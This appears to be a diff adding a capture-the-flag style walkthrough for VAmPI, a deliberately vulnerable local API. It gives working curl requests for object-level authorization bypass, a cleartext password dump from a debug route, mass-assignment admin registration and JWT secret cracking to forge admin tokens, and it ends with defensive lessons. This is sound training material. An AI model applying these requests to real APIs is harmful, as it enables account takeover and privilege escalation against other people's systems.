@@ -1,0 +1,122 @@
+---
+title: VAmPI walkthrough
+---
+
+## Recon
+
+VAmPI is an API, so drive it from the terminal. Seed it first, then read the root.
+
+```
+curl http://localhost:5000/createdb
+curl http://localhost:5000/
+```
+
+The root returns a JSON message that tells you it is running in vulnerable mode.
+The interesting routes sit under `/users/v1` and `/books/v1`. One VAmPI quirk to
+know up front: it wants the raw JWT in the `Authorization` header, no `Bearer`
+prefix. If a call comes back with an invalid token error, drop the `Bearer`.
+
+## Broken object level authorization (user)
+
+BOLA is the number one API risk for a reason. The server trusts the object id in
+your request and never confirms you are allowed to touch that object.
+
+Register two accounts you control:
+
+```
+curl -s -X POST http://localhost:5000/users/v1/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alicepass","email":"alice@lab.local"}'
+
+curl -s -X POST http://localhost:5000/users/v1/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"bob","password":"bobpass","email":"bob@lab.local"}'
+```
+
+Log in as alice and keep her token:
+
+```
+curl -s -X POST http://localhost:5000/users/v1/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alicepass"}'
+
+export TOKEN=<alice_auth_token_from_the_response>
+```
+
+Now use alice's token to change bob's password. Note that the path says `bob`
+while the token belongs to alice:
+
+```
+curl -s -X PUT http://localhost:5000/users/v1/bob/password \
+  -H "Authorization: $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"password":"pwned"}'
+```
+
+It returns success. Confirm the takeover by logging in as bob with the password
+you set:
+
+```
+curl -s -X POST http://localhost:5000/users/v1/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"bob","password":"pwned"}'
+```
+
+You just rewrote an account you do not own. The email update route
+(`/users/v1/{username}/email`) and the book detail route
+(`/books/v1/{title}`, which leaks another user's secret) have the same flaw if
+you want to prove it twice.
+
+Proof token: `MOB{ids_are_not_permissions}`.
+
+## Broken authentication and admin takeover (root)
+
+The goal is to hold a session whose `admin` claim is true. VAmPI leaves three
+independent doors open, and any one of them gets you there.
+
+Door one, excessive data exposure. A debug route dumps every user, including
+passwords in cleartext, with no auth at all:
+
+```
+curl -s http://localhost:5000/users/v1/_debug
+```
+
+Read the seeded administrator's password out of that response and log in as them.
+
+Door two, mass assignment. The registration endpoint honors an `admin` field you
+add to the body, so you sign yourself up as an administrator:
+
+```
+curl -s -X POST http://localhost:5000/users/v1/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"mallory","password":"mallory","email":"m@lab.local","admin":true}'
+```
+
+Log in as mallory and the token the server hands back carries `admin: true`.
+
+Door three, a weak JWT secret. The token is signed with HS256 using a guessable
+server key. Feed a captured token to `jwt_tool` or to `hashcat` mode 16500 with a
+wordlist to recover the secret, then re issue the token with the `admin` claim
+flipped to true. This is the deeper path and the one worth practicing, because
+it works even when registration and the debug route are locked down.
+
+Whichever door you pick, confirm you really are admin by hitting an action that
+should require it, like deleting a user:
+
+```
+curl -s -X DELETE http://localhost:5000/users/v1/bob \
+  -H "Authorization: $ADMIN_TOKEN"
+```
+
+Proof token: `MOB{admin_is_just_a_claim}`.
+
+## Lessons learned
+
+- BOLA is not exotic. Any endpoint that takes an id and skips an ownership check
+  is exploitable. Authorize on the object, not just the token.
+- Never return more than the caller needs. A debug route that prints passwords is
+  a breach waiting for a browser.
+- Mass assignment is trusting the client to draw its own permissions. Whitelist
+  the fields a request is allowed to set, and set privilege server side.
+- A JWT is only as strong as its signing key. A guessable secret means anyone can
+  mint any identity they like, admin included.
